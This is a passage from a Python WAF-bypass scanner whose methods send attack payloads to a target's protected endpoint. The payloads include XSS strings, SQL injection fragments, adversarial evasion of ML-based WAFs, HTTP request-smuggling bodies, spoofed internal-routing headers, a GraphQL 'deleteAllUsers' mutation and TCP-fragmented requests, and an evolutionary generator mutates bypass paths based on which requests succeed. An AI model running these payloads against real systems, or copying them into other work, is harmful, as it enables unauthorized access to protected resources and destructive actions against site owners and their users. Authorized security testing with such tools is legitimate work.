                response = self.session.get(self.forbidden_endpoint, headers=headers, timeout=5)

                if response.status_code == 200:
                    discrepancy = {
                        'type': 'QUIC/HTTP3',
                        'subtype': 'Alt-Svc Manipulation',
                        'description': 'Alt-Svc headers accepted and may affect routing',
                        'headers': headers
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "QUIC", "Alt-Svc manipulation possible")
            except:
                pass

    def test_ml_waf_evasion(self):
        """
        Advanced testing for ML-based WAF evasion using adversarial attacks, 
        token distribution manipulation, and context window overflows.
        """
        print("  🤖 Testing ML WAF Evasion (Adversarial Attacks)...")
        
        evasion_scenarios = [
            # 1. Adversarial Padding (Noise Injection)
            {
                'name': 'Benign Token Padding',
                'description': 'Injecting high-frequency benign tokens to lower malicious score',
                'payload': lambda: f"{' '.join(random.choices(['user', 'profile', 'settings', 'view', 'item'], k=150))} <script>alert(1)</script> {' '.join(random.choices(['about', 'contact', 'help', 'search', 'home'], k=150))}",
                'method': 'GET'
            },
            
            # 2. Semantic Jittering (Comment/Whitespace Injection)
            {
                'name': 'Semantic Jittering',
                'description': 'Using non-functional syntax changes to break pattern recognition',
                'payload': lambda: "SEL/**/ECT pas/**/swd FR/**/OM us/**/ers WH/**/ERE '1'='1'",
                'method': 'GET'
            },
            
            # 3. Unicode Homoglyph Attack
            {
                'name': 'Unicode Homoglyph',
                'description': 'Using look-alike unicode characters to bypass string matching',
                'payload': lambda: "<scr\u0456pt>al\u0435rt(1)</scr\u0456pt>", # Uses Cyrillic 'і' and 'е'
                'method': 'GET'
            },
            
            # 4. Context Window Overflow (Post Body)
            {
                'name': 'Context Window Overflow',
                'description': 'Exceeding the input window size of the ML model',
                'payload': lambda: ("A" * 8192) + " <img src=x onerror=alert(1)> " + ("B" * 8192),
                'method': 'POST'
            },
            
            # 5. Token Squashing (Concatenation)
            {
                'name': 'Token Squashing',
                'description': 'Avoiding spaces between tokens to break tokenization',
                'payload': lambda: "window['al'+'ert'](document['coo'+'kie'])",
                'method': 'GET'
            },
            
            # 6. Base64/Nested Encoding Confusion
            {
                'name': 'Double Encoding Confusion',
                'description': 'Forcing recursive decoding which might be limited in ML models',
                'payload': lambda: urllib.parse.quote(urllib.parse.quote("<script>alert(1)</script>")),
                'method': 'GET'
            },
            
            # 7. Distribution Shift (Character Frequency)
            {
                'name': 'Character Frequency Shift',
                'description': 'Using rare but valid encodings to shift character distribution',
                'payload': lambda: "".join([f"&#x{ord(c):02x};" for c in "<script>alert(1)</script>"]),
                'method': 'GET'
            }
        ]

        for scenario in evasion_scenarios:
            try:
                payload = scenario['payload']()
                if scenario['method'] == 'GET':
                    response = self.session.get(
                        f"{self.forbidden_endpoint}/?q={payload}",
                        timeout=5,
                        allow_redirects=False
                    )
                else:
                    response = self.session.post(
                        self.target_url,
                        data={'input': payload},
                        timeout=5,
                        allow_redirects=False
                    )

                # If the WAF doesn't block (usually 403/406), it might be an evasion
                if response.status_code not in [403, 406]:
                    self.discrepancies.append({
                        'type': 'ML WAF Evasion',
                        'subtype': scenario['name'],
                        'description': scenario['description'],
                        'payload': payload[:100] + '...',
                        'response_code': response.status_code,
                        'severity': 'HIGH'
                    })
                    print(f"    [!] Potential ML Evasion: {scenario['name']} ({response.status_code})")
            except Exception as e:
                # print(f"    [x] Scenario failed: {scenario['name']} ({str(e)})")
                pass

    def test_container_orchestration_bypass(self):
        """Test container/orchestration layer bypasses"""
        print("  🐳 Testing Container Orchestration Bypass...")

        try:
            test_endpoint = self.forbidden_endpoint or f"{self.target_url}/admin"

            k8s_headers = {
                'X-Forwarded-Host': 'admin-service.default.svc.cluster.local',
                'X-Envoy-Decorator-Operation': 'admin-service.admin.svc.cluster.local/*',
                'X-B3-TraceId': ''.join(random.choices('0123456789abcdef', k=32)),
                'X-B3-SpanId': ''.join(random.choices('0123456789abcdef', k=16))
            }

            response = self.session.get(
                test_endpoint,
                headers=k8s_headers,
                timeout=5
            )

            if response.status_code == 200:
                discrepancy = {
                    'type': 'Container Orchestration',
                    'subtype': 'Service Mesh Headers',
                    'description': 'K8s service mesh headers affect routing',
                    'headers': k8s_headers,
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "K8s", "Service mesh header bypass")
        except:
            pass

    def test_graphql_rest_confusion(self):
        """Test GraphQL-REST gateway confusion"""
        print("  📊 Testing GraphQL-REST Gateway Confusion...")

        try:
            graphql_in_rest = {
                'path': '/api/users/1;query{admin{password}}',
                'headers': {'Content-Type': 'application/json'}
            }

            response = self.session.get(
                f"{self.forbidden_endpoint}{graphql_in_rest['path']}",
                headers=graphql_in_rest['headers'],
                timeout=5
            )

            if 'admin' in response.text or 'graphql' in response.text.lower():
                discrepancy = {
                    'type': 'GraphQL-REST Confusion',
                    'subtype': 'REST to GraphQL Injection',
                    'description': 'GraphQL query in REST endpoint',
                    'injection_point': 'URL path parameter',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "GraphQL", "REST-GraphQL boundary confusion")
        except:
            pass

        # GraphQL Batching via REST
        try:
            batch_payload = {
                'query': [
                    'query { user { name } }',
                    'mutation { deleteAllUsers }'
                ]
            }

            response = self.session.post(
                f"{self.target_url}/graphql",
                json=batch_payload,
                timeout=5
            )

            if response.status_code == 200:
                discrepancy = {
                    'type': 'GraphQL-REST Confusion',
                    'subtype': 'Batch Query Injection',
                    'description': 'GraphQL batching accepted via REST',
                    'technique': 'Array of queries'
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "GraphQL", "Batch queries accepted")
        except:
            pass

    def test_http_smuggling(self):
        """Test for HTTP request smuggling vulnerabilities"""
        print("  🔀 Testing HTTP Request Smuggling...")

        smuggling_payloads = [
            {
                'headers': {
                    'Content-Length': '13',
                    'Transfer-Encoding': 'chunked'
                },
                'data': '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
            },
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'Content-Length': '0'
                },
                'data': '1\r\nZ\r\n0\r\n\r\n'
            },
            {
                'headers': {
                    'Content-Length': '6',
                    'Transfer-Encoding': 'chunked'
                },
                'data': '0\r\n\r\nX'
            },
            {
                'headers': {
                    'Content-Length': '44',
                    'Transfer-Encoding': 'chunked'
                },
                'data': (
                    '0\r\n\r\n'
                    'GET /admin HTTP/1.1\r\n'
                    'Host: internal\r\n\r\n'
                )
            },
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'Content-Length': '4'
                },
                'data': '5\r\nHELLO\r\n0\r\n\r\n'
            },
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'Content-Length': '1'
                },
                'data': '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
            },
            {
                'headers': [
                    ('Transfer-Encoding', 'identity'),
                    ('Transfer-Encoding', 'chunked')
                ],
                'data': '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
            },
            {
                'headers': [
                    ('Content-Length', '6'),
                    ('Content-Length', '44')
                ],
                'data': 'GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
            },
            {
                'headers': [
                    ('Content-Length', '44'),
                    ('Content-Length', '6')
                ],
                'data': 'GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
            },
            {
                'headers': [
                    ('Transfer-Encoding', 'chunked '),
                    ('Transfer-Encoding', 'Chunked'),
                    ('Transfer-Encoding', 'chunked\t'),
                    ('Transfer-Encoding', 'chunked, identity'),
                    ('Transfer-Encoding', 'identity, chunked'),
                    ('Content-Length', '4')
                ],
                'data': '0\r\n\r\n'
            },
            {
                'headers': {
                    'Transfer-Encoding': 'chunked'
                },
                'data': '0\n\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
            },
            {
                'headers': {
                    'Transfer-Encoding': 'chunked'
                },
                'data': 'FFFFFFFF\r\n0\r\n\r\n'
            },
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'Content-Length': '0'
                },
                'data': '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
            }
        ]

        for i, payload in enumerate(smuggling_payloads):
            try:
                marker = self.generate_unique_markers()['uuid']
                data_with_marker = payload['data'].replace('internal', marker)

                # Check if headers is a list (duplicate headers) or dict (normal headers)
                if isinstance(payload['headers'], list):
                    response = self.send_request_with_duplicate_headers(
                        'POST',
                        self.forbidden_endpoint,
                        payload['headers'],
                        data=data_with_marker,
                        timeout=5
                    )
                else:
                    response = self.session.post(
                        self.forbidden_endpoint,
                        headers=payload['headers'],
                        data=data_with_marker,
                        timeout=5
                    )

                if marker in response.text or response.status_code in [400, 413, 414]:
                    discrepancy = {
                        'type': 'HTTP Smuggling',
                        'test_id': f'smuggling_{i}',
                        'payload': payload,
                        'response_code': response.status_code,
                        'evidence': marker in response.text
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "HTTP Smuggling", f"Potential smuggling in test {i}")
            except:
                continue

    def test_unicode_confusion(self):
        """Test Unicode normalization discrepancies"""
        print("  🧬 Testing Unicode Confusion...")

        unicode_tests = [
            {
                'original': '/admin',
                'nfc': '/admin',
                'nfd': '/\u0061\u0300\u0064\u006D\u0069\u006E',
                'confusables': '/αdmin',
            },
            {
                'original': '/admin',
                'zwsp': '/ad\u200Bmin',
                'zwnj': '/ad\u200Cmin',
                'zwj': '/ad\u200Dmin',
            }
        ]

        for test_group in unicode_tests:
            original = test_group['original']

            for variant_name, variant_path in test_group.items():
                if variant_name == 'original':
                    continue

                try:
                    resp_original = self.session.get(f"{self.forbidden_endpoint}{original}")
                    resp_variant = self.session.get(f"{self.forbidden_endpoint}{variant_path}")

                    if resp_original.status_code != resp_variant.status_code:
                        discrepancy = {
                            'type': 'Unicode Confusion',
                            'variant': variant_name,
                            'original_path': original,
                            'variant_path': variant_path,
                            'original_code': resp_original.status_code,
                            'variant_code': resp_variant.status_code
                        }
                        self.chain_map['discrepancies'].append(discrepancy)
                        self.log_discovery("Discrepancy", "Unicode", f"{variant_name}: {resp_original.status_code} vs {resp_variant.status_code}")
                except:
                    continue

    def test_encoding_discrepancies(self):
        """Test multi-layer encoding discrepancies"""
        print("  🔢 Testing Encoding Discrepancies...")

        test_path = "/admin"
        encoding_chains = [
            {
                'name': 'Double URL Encoding',
                'path': urllib.parse.quote(urllib.parse.quote(test_path)),
            },
            {
                'name': 'HTML Entity Encoding',
                'path': ''.join(f'&#{ord(c)};' for c in test_path),
            },
            {
                'name': 'Mixed Encoding',
                'path': test_path.replace('a', '%61').replace('d', '&#100;'),
            },
            {
                'name': 'Base64 Parameter',
                'path': f"/?path={base64.b64encode(test_path.encode()).decode()}",
            }
        ]

        try:
            baseline = self.session.get(f"{self.forbidden_endpoint}{test_path}")
        except:
            return

        for encoding in encoding_chains:
            try:
                response = self.session.get(f"{self.forbidden_endpoint}{encoding['path']}")

                if response.status_code != baseline.status_code:
                    discrepancy = {
                        'type': 'Encoding Discrepancy',
                        'encoding_name': encoding['name'],
                        'encoded_path': encoding['path'],
                        'baseline_code': baseline.status_code,
                        'encoded_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Encoding", f"{encoding['name']}: {baseline.status_code} vs {response.status_code}")
            except:
                continue

    def test_parameter_pollution(self):
        """Test parameter pollution discrepancies"""
        print("  🔀 Testing Parameter Pollution...")

        pollution_tests = [
            "?param=value1&param=value2",
            "?param=value1&PARAM=value2",
            "?param[]=value1&param[]=value2",
            "?param=value1&param%5b%5d=value2"
        ]

        responses = {}
        for test in pollution_tests:
            try:
                response = self.session.get(f"{self.forbidden_endpoint}{test}")
                responses[test] = response.status_code
            except:
                responses[test] = f"Error"

        unique_responses = set(responses.values())
        if len(unique_responses) > 1:
            discrepancy = {
                'type': 'Parameter Pollution',
                'pollution_responses': responses,
                'unique_responses': len(unique_responses)
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Parameter Pollution", f"Inconsistent parameter handling: {len(unique_responses)} different responses")

    def test_tcp_fragmentation(self):
        """Test TCP fragmentation bypass techniques"""
        print("  🌊 Testing TCP Fragmentation Bypass...")

        try:
            import socket

            target_host = self.parsed_url.hostname
            target_port = 443 if self.parsed_url.scheme == 'https' else 80

            request_part1 = b"GET /adm"
            request_part2 = b"in HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n"

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if self.parsed_url.scheme == 'https':
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.minimum_version = ssl.TLSVersion.TLSv1_2
                sock = context.wrap_socket(sock, server_hostname=target_host)

            sock.connect((target_host, target_port))
            sock.send(request_part1)
            time.sleep(0.01)
            sock.send(request_part2)

            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()

            if "200 OK" in response or "admin" in response.lower():
                discrepancy = {
                    'type': 'TCP Fragmentation',
                    'description': 'TCP fragmentation may bypass WAF inspection',
                    'evidence': 'Fragmented request processed differently',
                    'payload': {'part1': request_part1.decode('utf-8', errors='ignore'), 'part2': request_part2.decode('utf-8', errors='ignore')}
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "TCP Fragmentation", "Potential fragmentation bypass")
        except:
            pass

    def test_compression_bomb(self):
        """Test compression bomb bypass technique"""
        print("  💣 Testing Compression Bomb Bypass...")

        try:
            large_payload = "A" * 10000
            compressed_payload = gzip.compress(large_payload.encode())

            headers = {
                'Content-Encoding': 'gzip',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': str(len(compressed_payload))
            }

            response = self.session.post(
                self.forbidden_endpoint,
                data=compressed_payload,
                headers=headers,
                timeout=10
            )

            if response.status_code in [200, 413, 414, 502]:
                discrepancy = {
                    'type': 'Compression Bypass',
                    'description': 'Compression may affect WAF inspection',
                    'compressed_size': len(compressed_payload),
                    'uncompressed_size': len(large_payload),
                    'ratio': len(large_payload) / len(compressed_payload),
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Compression", f"Compression ratio: {discrepancy['ratio']:.1f}x")
        except:
            pass

    def test_timing_race_conditions(self):
        """Test timing-based parser race conditions"""
        print("  ⏱️  Testing Timing Race Conditions...")

        try:
            import threading
            import queue

            results = queue.Queue()

            def send_delayed_request(delay, request_data):
                time.sleep(delay)
                try:
                    response = self.session.post(self.forbidden_endpoint, data=request_data, timeout=5)
                    results.put(('success', response.status_code, delay))
                except Exception as e:
                    results.put(('error', str(e), delay))

            test_data = "param=value&admin=true"
            delays = [0, 0.001, 0.01, 0.1]

            threads = []
            for delay in delays:
                thread = threading.Thread(target=send_delayed_request, args=(delay, test_data))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            timing_results = []
            while not results.empty():
                timing_results.append(results.get())

            status_codes = [r[1] for r in timing_results if r[0] == 'success']
            if len(set(status_codes)) > 1:
                discrepancy = {
                    'type': 'Timing Race Condition',
                    'description': 'Timing affects request processing',
                    'timing_results': timing_results,
                    'unique_responses': len(set(status_codes))
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Timing Race", f"Timing-dependent responses: {len(set(status_codes))}")
        except:
            pass

    def test_anchor_tag_mutations(self):
        """
        Test WAF bypass using <a> tag mutation points.

        Sends mutated <a href> payloads to the forbidden endpoint as POST body
        parameters and query parameters. WAFs that pattern-match on fixed strings
        like '<a href="javascript:' may miss mutations at specific points inside
        the tag. A 200 response is a confirmed bypass; other status changes are
        discrepancies worth investigating.
        """
        print("  🔗 Testing Anchor Tag Mutation Points...")

        if not ADVANCED_MODULES_AVAILABLE:
            print("    ⚠ AnchorTagMutationEngine not available (advanced modules missing)")
            return

        try:
            engine = AnchorTagMutationEngine()
        except Exception as e:
            print(f"    ⚠ Could not initialise AnchorTagMutationEngine: {e}")
            return

        mutations = engine.generate_all()
        confirmed = 0
        discrepancies = 0

        for mutation in mutations:
            payload = mutation['payload']
            mp = mutation['mutation_point']
            desc = mutation['description']

            # Test as POST body parameter
            try:
                response = self.session.post(
                    self.forbidden_endpoint,
                    data={'input': payload, 'q': payload},
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=5,
                    allow_redirects=False
                )
                status = response.status_code
                if status not in [400, 401, 403, 429]:
                    is_confirmed_bypass = status in [200, 201, 202, 203, 204, 205, 206]
                    if status in [200, 201]:
                        sev = 'CRITICAL'
                    elif status in [202, 203, 204, 205, 206]:
                        sev = 'HIGH'
                    else:
                        sev = 'LOW'
                    self.discrepancies.append({
                        'type': 'Anchor Tag Mutation',
                        'mutation_point': mp,
                        'description': desc,
                        'payload': payload,
                        'method': 'POST',
                        'forbidden_url': self.forbidden_endpoint,
                        'response_code': status,
                        'severity': sev,
                        'is_confirmed_bypass': is_confirmed_bypass,
                        'evidence': f'POST body: status changed 403 → {status}',
                    })
                    if is_confirmed_bypass:
                        confirmed += 1
                        print(f"    ✅ Bypass Confirmed [{mp}] {desc} → {status}")
                    else:
                        discrepancies += 1
            except Exception:
                pass

            # Test as GET query parameter
            try:
                import urllib.parse as _up
                test_url = self.forbidden_endpoint + '?q=' + _up.quote(payload, safe='')
                response = self.session.get(
                    test_url,
                    timeout=5,
                    allow_redirects=False
                )
                status = response.status_code
                if status not in [400, 401, 403, 429]:
                    is_confirmed_bypass = status in [200, 201, 202, 203, 204, 205, 206]
                    if status in [200, 201]:
                        sev = 'CRITICAL'
                    elif status in [202, 203, 204, 205, 206]:
                        sev = 'HIGH'
                    else:
                        sev = 'LOW'
                    self.discrepancies.append({
                        'type': 'Anchor Tag Mutation',
                        'mutation_point': mp,
                        'description': desc,
                        'payload': payload,
                        'method': 'GET',
                        'forbidden_url': test_url,
                        'response_code': status,
                        'severity': sev,
                        'is_confirmed_bypass': is_confirmed_bypass,
                        'evidence': f'GET param: status changed 403 → {status}',
                    })
                    if is_confirmed_bypass:
                        confirmed += 1
                        print(f"    ✅ Bypass Confirmed [{mp}] {desc} (GET) → {status}")
                    else:
                        discrepancies += 1
            except Exception:
                pass

        print(f"    📊 Anchor Tag Mutations: {confirmed} confirmed bypasses, "
              f"{discrepancies} discrepancies out of {len(mutations)} mutations tested")

    # ========================================================================
    # ADVANCED BYPASS DISCOVERY METHODS (v4.0 - Revolutionary Techniques)
    # ========================================================================

    def test_advanced_response_differential(self):
        """
        🧠 ADVANCED: Statistical response differential analysis using Bayesian inference.

        Revolutionary technique combining:
        - Z-score anomaly detection
        - Shannon entropy analysis
        - Mahalanobis distance in feature space
        - Bayesian probability assessment
        """
        if not self.advanced_enabled or not self.differential_analyzer:
            return

        print("\n  🔬 Testing Advanced Response Differential Analysis...")
        print("     [Bayesian Inference + Statistical Anomaly Detection]")

        # Test suite combining multiple bypass vectors
        advanced_tests = [
            {'name': 'Referer Same-Origin', 'headers': {'Referer': f"{self.parsed_url.scheme}://{self.parsed_url.netloc}/"}},
            {'name': 'Origin Null (Sandboxed)', 'headers': {'Origin': 'null'}},
            {'name': 'X-Forwarded-For Internal', 'headers': {'X-Forwarded-For': '127.0.0.1'}},
            {'name': 'X-Original-URL Bypass', 'headers': {'X-Original-URL': self.parsed_url.path}},
            {'name': 'X-HTTP-Method-Override', 'headers': {'X-HTTP-Method-Override': 'GET'}, 'method': 'POST'},
            {'name': 'Accept JSON Format', 'headers': {'Accept': 'application/json'}},
            {'name': 'Sec-Fetch-Site Same-Origin', 'headers': {'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'navigate'}},
        ]

        for test in advanced_tests:
            try:
                self.rate_limiter.wait()

                method = test.get('method', 'GET')
                response = self.session.request(
                    method=method,
                    url=self.forbidden_endpoint,
                    headers=test['headers'],
                    timeout=10,
                    allow_redirects=False
                )

                # Perform advanced statistical analysis
                analysis = self.differential_analyzer.analyze_response_differential(
                    response,
                    test['name'],
                    test
                )

                # Check if Bayesian inference suggests bypass
                if analysis['is_bypass']:
                    self.discrepancies.append({
                        'type': 'Advanced Statistical Bypass',
                        'test_name': test['name'],
                        'headers': test['headers'],
                        'response_code': response.status_code,
                        'bayesian_probability': analysis['bayesian_probability'],
                        'confidence_level': analysis['confidence_level'],
                        'severity': 'CRITICAL' if analysis['bayesian_probability'] > 0.85 else 'HIGH',
                        'evidence': analysis['summary'],
                        'detailed_findings': analysis['findings'],
                        'bayesian_explanation': analysis['bayesian_explanation']
                    })

                    print(f"    [!] 🎯 BYPASS DETECTED: {test['name']}")
                    print(f"        Probability: {analysis['bayesian_probability']:.2%}")
                    print(f"        Confidence: {analysis['confidence_level']}")

                elif analysis['findings']:
                    # Interesting differential even if not confirmed bypass
                    print(f"    [~] Differential detected: {test['name']} ({len(analysis['findings'])} anomalies)")

            except Exception as e:
                pass

    def test_semantic_bypass_discovery(self):
        """
        🧬 ADVANCED: Semantic error analysis with evolutionary payload generation.

        Revolutionary technique combining:
        - NLP-inspired error classification
        - Evolutionary algorithms for mutation
        - Fuzzy logic for pattern matching
        - Attack vector ontology
        """
        if not self.advanced_enabled or not self.semantic_engine:
            return

        print("\n  🧬 Testing Semantic Bypass Discovery...")
        print("     [NLP + Evolutionary Algorithms]")

        # Get baseline error for semantic analysis
        try:
            baseline_response = self.session.get(
                self.forbidden_endpoint,
                timeout=10,
                allow_redirects=False
            )

            # Classify error semantically
            semantic_analysis = self.semantic_engine.analyze_response_semantics(
                baseline_response.text,
                dict(baseline_response.headers),
                baseline_response.status_code
            )

            primary_cls = semantic_analysis['classification']['primary_classification']
            cls_type = primary_cls['type'] if primary_cls else 'Unknown'
            cls_confidence = primary_cls['confidence'] if primary_cls else 0.0
            bypassability = semantic_analysis['is_bypassable']
            vectors = semantic_analysis['suggested_vectors']

            print(f"     Status Code    : {baseline_response.status_code}")
            print(f"     Classification : {cls_type} (confidence: {cls_confidence:.0%})")
            print(f"     Bypassability  : {bypassability:.2%}  {'[high]' if bypassability >= 0.60 else '[medium]' if bypassability >= 0.40 else '[low]'}")
            print(f"     Attack Vectors : {', '.join([v.value for v in vectors[:3]]) if vectors else 'none suggested'}")

            # Generate evolved bypass payloads — 5 generazioni con feedback reale.
            # Il loop è nel chiamante, non nell'engine (max_generations=1 per chiamata).
            # fitness_scores vengono aggiornati dopo ogni generazione dai risultati reali.
            if vectors:
                print("\n     Generating evolved bypass mutations (5 generations)...")

                base_path = self.parsed_url.path
                # fitness_scores: {payload: score} — alimenta la generazione successiva
                fitness_scores: dict = {}
                hits = 0
                all_tested: set = set()

                for gen in range(1, 6):
                    # Converti fitness_scores nel formato atteso da generate_evolved_bypasses
                    previous_results = [
                        {'payload': p, 'differential_score': s}
                        for p, s in fitness_scores.items()
                    ]
                    evolved_candidates = self.semantic_engine.generate_evolved_bypasses(
                        base_path,
                        previous_results=previous_results if previous_results else None,
                        max_generations=1
                    )

                    # Selezione diversa: almeno 1 per operatore, fino a 15 totali
                    seen_operators: set = set()
                    diverse_candidates = []
                    for c in evolved_candidates:
                        if c['operator'] not in seen_operators:
                            diverse_candidates.append(c)
                            seen_operators.add(c['operator'])
                    for c in evolved_candidates:
                        if len(diverse_candidates) >= 15:
                            break
                        if c not in diverse_candidates:
                            diverse_candidates.append(c)

                    # Filtra già testati
                    diverse_candidates = [
                        c for c in diverse_candidates
                        if c['payload'] not in all_tested
                    ]

                    if not diverse_candidates:
                        print(f"     Gen {gen}: no new candidates, stopping early")
                        break

                    print(f"     Gen {gen}: {len(diverse_candidates)} candidates "
                          f"(ops: {', '.join(sorted(seen_operators))})\n")

                    gen_fitness: dict = {}

                    for idx, candidate in enumerate(diverse_candidates, 1):
                        self.rate_limiter.wait()

                        test_path = candidate['payload']
                        op = candidate['operator']
                        gen = candidate['generation']

                        # Percent-encode raw control characters e non-ASCII per evitare
                        # InvalidURL. Caratteri legali nel path HTTP (RFC 3986 §3.3) left
                        # alone; tutto il resto viene codificato come %XX.
                        try:
                            encoded_path = urllib.parse.quote(
                                test_path,
                                safe="/:@!$&'()*+,;=-._%~"  # keep pct-encoded seqs intact
                            )
                        except Exception:
                            print(f"     [?] [{idx}/{len(diverse_candidates)}] op={op} → invalid mutation (skipped)")
                            gen_fitness[test_path] = 0.0
                            all_tested.add(candidate['payload'])
                            continue

                        test_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{encoded_path}"

                        try:
                            response = self.session.get(test_url, timeout=5, allow_redirects=False)
                            status = response.status_code

                            if status not in [401, 403, 404, 429]:
                                hits += 1
                                # Fitness: 1.0 se 2xx, 0.3 se discrepancy non confermata
                                gen_fitness[test_path] = (
                                    1.0 if status in range(200, 207) else 0.3
                                )
                                self.discrepancies.append({
                                    'type': 'Semantic Evolutionary Bypass',
                                    'mutation_operator': op,
                                    'generation': gen,
                                    'original_payload': base_path,
                                    'evolved_payload': test_path,
                                    'forbidden_url': self.forbidden_endpoint,
                                    'url': test_url,
                                    'response_code': status,
                                    'severity': 'HIGH' if status == 200 else 'MEDIUM',
                                    'source': 'advanced',
                                    'evidence': f"Evolved payload bypassed via {op}"
                                })
                                print(f"    [!] 🧬 Bypass [{idx}/{len(diverse_candidates)}] op={op} gen={gen} → HTTP {status}")
                                print(f"        Payload: {test_path[:80]}")

                                # Confirm with IntelligentBypassValidator
                                validation = self._confirm_chain_hit(
                                    url=test_url,
                                    headers={},
                                    method='GET',
                                    technique_name=f'Semantic/{op}',
                                    category='path',
                                    initial_status=status
                                )
                                conf = validation['confidence']
                                prob = validation.get('probability', 0.0)
                                if validation['confirmed']:
                                    print(f"    [✔] Validation: {conf} ({prob:.0%})"
                                          f"  via {validation.get('strategy', '?')}")
                                    self.discrepancies[-1]['severity'] = 'CRITICAL'
                                    self.discrepancies[-1]['validated'] = True
                                    self.discrepancies[-1]['validation_confidence'] = conf
                                    gen_fitness[test_path] = 1.0
                                else:
                                    print(f"    [?] Validation: {conf} ({prob:.0%})"
                                          f"  — discrepancy, not confirmed bypass")
                                    self.discrepancies[-1]['validated'] = False
                                    self.discrepancies[-1]['validation_confidence'] = conf

                                # Learn from success
                                self.semantic_engine.learn_from_success(
                                    vectors[0],
                                    test_path,
                                    {'differential_score': validation.get('probability', 1.0)}
                                )
                            else:
                                # Bloccato: fitness 0.0
                                gen_fitness[test_path] = 0.0
                                print(f"     [-] [{idx}/{len(diverse_candidates)}] op={op} → HTTP {status} (blocked)")

                        except requests.exceptions.InvalidURL as exc:
                            print(f"     [?] [{idx}/{len(diverse_candidates)}] op={op} → invalid URL ({exc})")
                            gen_fitness[test_path] = 0.0
                        except (requests.exceptions.ConnectionError,
                                requests.exceptions.Timeout) as exc:
                            print(f"     [?] [{idx}/{len(diverse_candidates)}] op={op} → connection error ({type(exc).__name__})")
                            gen_fitness[test_path] = 0.0
                        except Exception as exc:
                            print(f"     [?] [{idx}/{len(diverse_candidates)}] op={op} → request error ({type(exc).__name__})")
                            gen_fitness[test_path] = 0.0

                        all_tested.add(candidate['payload'])

                    # Fitness score per questa generazione
                    all_tested.add(candidate['payload'])

                    # Aggiorna fitness_scores per la prossima generazione
                    fitness_scores.update(gen_fitness)
                    print(f"     Gen {gen} fitness update: {len(gen_fitness)} scored")

                print(f"\n     🧬 Semantic scan complete: {hits} bypass(es) found "
                      f"across 5 generations")

        except Exception as e:
            print(f"     ⚠️  Semantic analysis error: {str(e)}")

    def test_graph_optimized_attack_chain(self):
        """
        🎯 ADVANCED: Graph-theoretical attack chain optimization.

        Revolutionary technique combining:
        - A* search for optimal path finding
        - Game theory for strategy optimization
        - Dynamic programming for memoization
        - Nash equilibrium for technique mixing
        """
        if not self.advanced_enabled or not self.attack_planner:
            return

        print("\n  🎯 Testing Graph-Optimized Attack Chains...")
        print("     [A* Search + Game Theory + Nash Equilibrium]")

        # Plan optimal attack sequence
        attack_plan = self.attack_planner.plan_attack_sequence()

        if not attack_plan['success']:
            print(f"     ⚠️  No viable attack path found")
            return

        details = attack_plan['optimal_path_details']
        ev = details['expected_value']
        ev_label = 'high' if ev >= 20 else 'medium' if ev >= 8 else 'low'

        print(f"\n     📊 Optimal Attack Plan Generated:")
        print(f"        Path Length      : {len(attack_plan['optimal_path'])} techniques")
        print(f"        Success Prob.    : {details['success_probability']:.2%}")
        print(f"        Detection Risk   : {details['detection_risk']:.2%}")
        print(f"        Expected Value   : {ev:.2f} [{ev_label}]  (P(success)×100 − P(detect)×cost)")

        print(f"\n     🔗 Attack Chain:")
        for i, technique_name in enumerate(details['techniques'], 1):
            node_id = attack_plan['optimal_path'][i - 1]
            node = self.attack_planner.graph.nodes[node_id]
            print(f"        {i}. {technique_name}"
                  f"  (p={node.success_probability:.0%}, risk={node.detection_risk:.0%})")

        # Execute techniques from attack plan
        print(f"\n     Executing optimal attack chain...")

        technique_mapping = {
            'Header Manipulation': self._execute_header_manipulation,
            'Path Traversal': self._execute_path_traversal,
            'HTTP Method Override': self._execute_method_override,
            'Encoding Evasion': self._execute_encoding_evasion,
            'Referer/Origin Spoofing': self._execute_referer_spoofing,
        }

        execution_feedback = {}

        # Pre-compute stack_sig once for outcome recording (TASK 5.1)
        _exec_stack_sig = _build_stack_signature(
            self.stack_analyzer.stack.get('layers', [])
        )

        for technique_id in attack_plan['optimal_path'][1:-1]:  # Skip start and end nodes
            node = self.attack_planner.graph.nodes[technique_id]
            technique_name = node.name

            if technique_name in technique_mapping:
                try:
                    result = technique_mapping[technique_name]()
                    execution_feedback[technique_id] = result

                    # Record outcome in SQLite learning DB (TASK 5.1)
                    if self.learning_db and self.scan_id is not None:
                        try:
